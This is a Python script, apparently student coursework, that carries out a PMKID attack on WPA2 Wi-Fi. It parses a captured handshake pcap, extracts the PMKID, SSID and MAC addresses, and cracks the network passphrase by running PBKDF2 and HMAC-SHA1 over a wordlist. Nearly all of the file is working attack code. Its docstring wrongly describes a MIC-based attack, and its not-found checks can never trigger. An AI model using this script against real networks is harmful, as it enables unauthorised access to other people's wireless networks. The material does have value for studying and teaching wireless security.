#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Pmkid Attack

Script to test multiple passwords from a file, creates a MIC with each password and compares it with the one retrieved in the last packet of the 4-way handshake.
"""

from numpy import array
from numpy import array_split
from pbkdf2 import *
from binascii import a2b_hex, b2a_hex
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import hmac
import hashlib

from scaircrack import get_passphrases

TO_DS = 0b01

#For some reason indexes are broken between to pcap files so had to redefine the function here as well.....
def collect_infos_from_pcap(pcapfile, constructor_mac_prefix=""):
    """
    This function parses a pcap file and returns the following parameters:
    - APmac
    - Clientmac
    - APnonce
    - Clientnonce
    - MIC
    - data
    """
    wpa = rdpcap(pcapfile)

    # identify where is the first packet of the 4-way handshake
    for i in range(0, len(wpa)):
        if wpa[i].type == 2 and wpa[i].subtype == 8:
            try:
                if wpa[i][EAPOL].type == 3:
                    
                    print("yessssss")
                    #check if it is the first packet of the 4-way handshake based on the message info number
                    to_ds = wpa[i].FCfield & TO_DS != 0 # Identify the direction of the message C->AP or AP->
                    if to_ds:
                       continue
                    else:
                        print("AP -> CLI")
                        print(i)
                    

                    if (constructor_mac_prefix == ""):
                        break

                    #check MAC of the AP to keep only the 4-way handshake related to the constructor selected
                    if (str(wpa[i].addr2).startswith(constructor_mac_prefix)):
                        break
                        
            except:
                pass

    if (i == len(wpa)):
        print("No 4-way handshake found in the pcap file")
        exit()


    # retrieve APmac and clientmac from the first packet of the 4-way handshake
    Clientmac = a2b_hex(wpa[i].addr1.replace(":", ""))
    APmac = a2b_hex(wpa[i].addr2.replace(":", ""))

    #retrieve pmkid
    pmkid = wpa[i].original[-20:-4]
    print("PMKID: ", pmkid)

    #retrieve ssid from the beacon frame
    #iterate over all packets before the 4-way handshake
    for j in range(0, i):
        #check if the packet is a beacon frame
        if wpa[j].type == 0 and wpa[j].subtype == 8:
            #check if the beacon frame is from the same AP as the 4-way handshake
            if str(wpa[j].addr2).replace(":", "") == APmac.hex():
                ssid = wpa[j].info.decode("utf-8")
                break
    
    if (j == i):
        print("No beacon frame found in the pcap file")
        exit()

    print("We found all required parameters for the attack in the pcap !")

    return ssid, APmac, Clientmac, pmkid

def main():
    # retrieve infos from 4way handshake
    ssid, Apmac, Clientmac, pmkid = collect_infos_from_pcap(
        "./PMKID_handshake.pcap", "90:4d:4a")

    for passphrase in get_passphrases("wordlist.txt"):
        PMK = pbkdf2(hashlib.sha1, str.encode(passphrase.replace("\n", "")), ssid.encode(), 4096, 32)
        #convert to bytearray
        data = b"PMK Name" + Apmac + Clientmac
        PMKID = hmac.new(PMK, data, hashlib.sha1)

        print("first: ", PMKID.hexdigest())
        print("second: ", pmkid.hex())

        if pmkid.hex().startswith(PMKID.hexdigest()):
            print("FOUND PMK: ", passphrase)
            break

    
 

if __name__ == "__main__":
    main()

